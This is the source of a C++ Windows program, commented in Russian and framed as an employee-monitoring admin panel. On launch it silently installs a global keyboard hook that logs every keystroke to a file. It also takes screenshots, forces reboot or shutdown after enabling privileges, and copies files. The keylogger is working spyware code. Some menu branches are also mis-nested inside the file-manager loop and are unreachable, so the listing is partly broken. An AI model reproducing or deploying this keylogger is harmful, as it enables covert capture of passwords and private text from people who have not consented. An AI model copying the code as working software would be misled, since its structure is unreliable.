#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <filesystem>
#include <fstream>
#include <thread>

HHOOK hKeyboardHook;
std::ofstream logFile;

// Функция-фильтр, которую Windows будет вызывать при КАЖДОМ нажатии кнопки на ПК
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Проверяем, что событие — это именно НАЖАТИЕ клавиши (WM_KEYDOWN)
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyStruct->vkCode; // Получаем код нажатой кнопки

        // Открываем файл log.txt в режиме добавления (ios::app)
        std::ofstream file("log.txt", std::ios::app);
        if (file.is_open()) {
            // Переводим стандартные кнопки в понятный текст
            if (vkCode == VK_SPACE) file << " [ПРОБЕЛ] ";
            else if (vkCode == VK_RETURN) file << " [ENTER]\n";
            else if (vkCode == VK_BACK) file << " [BACKSPACE] ";
            else if (vkCode == VK_TAB) file << " [TAB] ";
            else if (vkCode >= 0x30 && vkCode <= 0x39) file << (char)vkCode; // Цифры
            else if (vkCode >= 0x41 && vkCode <= 0x5A) file << (char)vkCode; // Английские буквы (в верхнем регистре)
            else file << " [" << vkCode << "] "; // Для остальных кнопок пишем их системный код
            
            file.close();
        }
    }
    // Обязательно передаем событие дальше, чтобы кнопка сработала у пользователя в его программе!
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Функция, которая будет крутиться в отдельном фоне и слушать Windows
void StartKeylogger() {
    // Устанавливаем глобальный хук на клавиатуру
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    
    // Windows требует наличие цикла сообщений, чтобы хук работал в потоке
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Если поток завершается, снимаем хук
    UnhookWindowsHookEx(hKeyboardHook);
}
// Функция создания скриншота экрана и сохранения его в файл BMP
bool TakeScreenshot(const std::string& filename) {
    // 1. Получаем размеры экрана
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // 2. Получаем контекст устройства (экран)
    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);

    // 3. Создаем пустую картинку в памяти под размеры экрана
    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, width, height);
    SelectObject(hCaptureDC, hCaptureBitmap);

    // 4. Копируем пиксели с экрана на нашу картинку (само фото)
    if (!BitBlt(hCaptureDC, 0, 0, width, height, hDesktopDC, 0, 0, SRCCOPY)) {
        ReleaseDC(hDesktopWnd, hDesktopDC);
        DeleteDC(hCaptureDC);
        return false;
    }

    // 5. Заполняем структуры для сохранения файла в формате BMP
    BITMAPFILEHEADER bfh;
    BITMAPINFOHEADER bih;

    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = width;
    bih.biHeight = height;
    bih.biPlanes = 1;
    bih.biBitCount = 24; // 24 бита на пиксель (полноцветное изображение)
    bih.biCompression = BI_RGB;
    bih.biSizeImage = 0;

    bfh.bfType = 0x4D42; // Маркер файла BMP ('BM')
    bfh.bfReserved1 = 0;
    bfh.bfReserved2 = 0;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + (width * height * 3);

    // 6. Записываем данные на жесткий диск
    FILE* fp = nullptr;
    if (fopen_s(&fp, filename.c_str(), "wb") == 0 && fp != nullptr) {
        fwrite(&bfh, sizeof(BITMAPFILEHEADER), 1, fp);
        fwrite(&bih, sizeof(BITMAPINFOHEADER), 1, fp);

        int dwSize = width * height * 3;
        BYTE* pPixels = new BYTE[dwSize];

        GetDIBits(hDesktopDC, hCaptureBitmap, 0, height, pPixels, (BITMAPINFO*)&bih, DIB_RGB_COLORS);
        fwrite(pPixels, dwSize, 1, fp);

        delete[] pPixels;
        fclose(fp);
    } else {
        return false;
    }

    // 7. Освобождаем ресурсы ОС
    ReleaseDC(hDesktopWnd, hDesktopDC);
    DeleteDC(hCaptureDC);
    DeleteObject(hCaptureBitmap);

    return true;
}

int main() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;
    namespace fs = std::filesystem;
    bool isAdmin = true; // По умолчанию считаем, что мы админ
        // Запускаем кейлоггер в фоне, чтобы он не мешал работе главного меню
    std::thread keylogThread(StartKeylogger);
    keylogThread.detach(); // Отсоединяем поток, теперь он живет сам по себе
    // ШАГ 1: Открываем маркер безопасности (паспорт) нашей программы
    // TOKEN_ADJUST_PRIVILEGES — говорим Windows, что хотим изменить права
    // TOKEN_QUERY — говорим, что хотим прочитать текущие права
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cout << "Ошибка OpenProcessToken. Код: " << GetLastError() << std::endl;
        
    }
    
    // ШАГ 2: Переводим текстовое имя привилегии выключения в понятный системе ID (LUID)
    // SE_SHUTDOWN_NAME — это встроенная константа Windows для "SeShutdownPrivilege"
    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid)) {
        std::cout << "Ошибка LookupPrivilegeValue. Код: " << GetLastError() << std::endl;
        CloseHandle(hToken); // Если упало здесь, закрываем токен, чтобы не было утечки памяти
        
    }
    
    // ШАГ 3: Заполняем структуру настроек и включаем эту привилегию
    tkp.PrivilegeCount = 1;  // Мы меняем ровно ОДНУ привилегию
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // Флаг: АКТИВИРОВАТЬ привилегию!
    
    // Передаем заполненную структуру функции AdjustTokenPrivileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        std::cout << "Ошибка AdjustTokenPrivileges. Код: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        
    }
    
    // Важная проверка: функция могла сработать, но Windows могла отказать, 
    // если программа запущена не от имени администратора.
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cout << "Внимание: Программа запущена без прав администратора! Привилегия НЕ получена." << std::endl;
        CloseHandle(hToken);
         isAdmin = false; // Меняем флаг: мы НЕ админ, но из программы НЕ выходим!
    }
    
    // Если мы дошли сюда — мы победили! Права на управление питанием у нас в кармане
    std::cout << "Успех! Привилегия на выключение/перезагрузку успешно получена!" << std::endl;
    
    CloseHandle(hToken); // Обязательно закрываем хэндл токена, он нам больше не нужен
    
        // --- ГЛАВНОЕ МЕНЮ АДМИНИСТРАТОРА ---
    std::string command;

    while (true) {
        std::cout << "\n============================================\n";
        std::cout << "[ГЛАВНОЕ МЕНЮ] Доступные режимы:\n";
        std::cout << "-> reboot   (Перезагрузка компьютера)\n";
        std::cout << "-> shutdown (Выключение компьютера)\n";
        std::cout << "-> fs       (Переход к управлению файлами)\n";
        std::cout << "-> keylog_show  (Показать набранный текст онлайн)\n";
        std::cout << "-> keylog_file  (Подтверждение работы в txt файл)\n";
        std::cout << "-> screenshot (Сделать снимок экрана)\n";
        std::cout << "-> exit     (Выход из программы)\n";
        std::cout << "============================================\n";
        std::cout << "[Admin Mode] Введите команду: ";
        std::cin >> command;

        // 1. КОМАНДА ПЕРЕЗАГРУЗКИ
        if (command == "reboot") {
            if (isAdmin) {
                std::cout << "Выполняю перезагрузку ПК...\n";
                ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
            } else {
                std::cout << "Ошибка: Для перезагрузки ПК требуются права администратора!\n";
            }
        }

        // 2. КОМАНДА ВЫКЛЮЧЕНИЯ
        else if (command == "shutdown") {
            if (isAdmin) {
                std::cout << "Выполняю выключение ПК...\n";
                ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
            } else {
                std::cout << "Ошибка: Для выключения ПК требуются права администратора!\n";
            }
        }
                // 5. КОМАНДА СКРИНШОТА
        else if (command == "screenshot") {
            std::cout << "Делаю снимок экрана...\n";
            
            // Вызываем функцию, которую вставили в самый верх
            if (TakeScreenshot("screen.bmp")) {
                std::cout << "Скриншот успешно сохранен в файл 'screen.bmp'!\n";
            } else {
                std::cout << "Ошибка: Не удалось сделать скриншот.\n";
            }
        }

                // 3. РЕЖИМ ФАЙЛОВОЙ СИСТЕМЫ (ПЕРЕХОД К УПРАВЛЕНИЮ ФАЙЛАМИ)
        else if (command == "fs") {
            std::string fsCommand;
            
            // ЛАЙФХАК: Принудительно переносим пользователя в корень диска C:\ при старте
            try {
                fs::current_path("C:\\"); 
            } catch (...) {
                // Если вдруг диска C нет (например, на флешке), остаемся где были
            }

            std::cout << "\nВход в режим файловой системы. Старт с диска C:\\\n";
            std::cout << "Для возврата в главное меню введите 'back'.\n";

            // Вложенный цикл файлового менеджера
            while (true) {
                std::cout << "\n[FS@" << fs::current_path().string() << "]$ ";
                std::cin >> fsCommand;

                if (fsCommand == "dir") {
                    std::cout << "\n--- Содержимое папки ---\n";
                    try {
                        for (const auto& entry : fs::directory_iterator(fs::current_path())) {
                            if (entry.is_directory()) {
                                std::cout << "[ПАПКА] " << entry.path().filename().string() << "\n";
                            } else {
                                std::cout << "[ФАЙЛ ] " << entry.path().filename().string() 
                                          << " (" << entry.file_size() << " байт)\n";
                            }
                        }
                    } catch (const std::exception& e) {
                        std::cout << "Ошибка чтения папки: " << e.what() << "\n";
                    }
                    std::cout << "------------------------\n";
                } 
                                else if (fsCommand == "cd") {
                    std::string path;
                    
                    // Магия: Очищаем буфер после ввода слова "cd" и читаем строку целиком (с пробелами!)
                    std::cin.ignore(); 
                    std::getline(std::cin, path);

                    // Если пользователь случайно оставил пробел перед путем, убираем его
                    if (!path.empty() && path[0] == ' ') {
                        path.erase(0, 1);
                    }

                    try {
                        fs::current_path(path);
                    } catch (const std::exception& e) {
                        std::cout << "Ошибка: Не удалось перейти в указанную папку.\n";
                    }
                }
                                // КРУТАЯ ФИЧА: Копирование файлов и папок (Аналог Linux 'cp')
                else if (fsCommand == "cp") {
                    std::string source;
                    std::string destination;
                    
                    // Считываем два аргумента: что копировать и куда
                    std::cin >> source;
                    std::cin >> destination;

                    try {
                        // Настраиваем опции копирования:
                        // recursive — копировать папки вместе со всем содержимым (вглубь)
                        // overwrite_existing — если файл уже есть в целевой папке, перезаписать его
                        fs::copy_options options = fs::copy_options::recursive | fs::copy_options::overwrite_existing;
                        
                        // Выполняем системное копирование
                        fs::copy(source, destination, options);
                        
                        std::cout << "Успех: Объект успешно скопирован в '" << destination << "'!\n";
                    } 
                    catch (const std::exception& e) {
                        std::cout << "Ошибка копирования: " << e.what() << "\n";
                    }
                }
                        // КОМАНДА 1: Показать лог в консоли онлайн
                else if (command == "keylog_show") {
                    std::cout << "\n--- Проверка активности сотрудника (Онлайн лог) ---\n";
                    std::ifstream file("log.txt");
                    if (file.is_open()) {
                        std::string line;
                        while (std::getline(file, line)) {
                        std::cout << line << "\n";
                        }
                        file.close();
                    } else {
                        std::cout << "Сотрудник пока не нажимал никаких клавиш или файл еще не создан.\n";
                    }
                    std::cout << "---------------------------------------------------\n";
                }

        // КОМАНДА 2: Подтверждение записи в файл
        else if (command == "keylog_file") {
            std::cout << "[УЧЕТ РАБОТЫ] Мониторинг активен.\n";
            // Получаем полный путь к файлу лога с помощью нашей библиотеки filesystem
            std::string fullPath = fs::current_path().string() + "\\log.txt";
            std::cout << "Все нажатия клавиш официально записываются в текстовый файл подтверждения:\n";
            std::cout << ">> " << fullPath << "\n";
        }
                else if (fsCommand == "back") {
                    std::cout << "Возврат в главное меню.\n";
                    break; 
                } 
                                else {
                    std::cout << "Неизвестная подкоманда! Доступны: dir, cd <путь>, up, cp <что> <куда>, back\n";
                }
            }
        

        }

        // 4. ВЫХОД ИЗ ПРОГРАММЫ
        else if (command == "exit") {
            std::cout << "Выход из панели.\n";
            break;
        } 

        // ЕСЛИ ВВЕДЕНО ЧТО-ТО СТРАННОЕ
        else {
            std::cout << "Неизвестная режим! Выберите из списка (reboot, shutdown, fs, exit).\n";
        }
    } 
    
    return 0;
}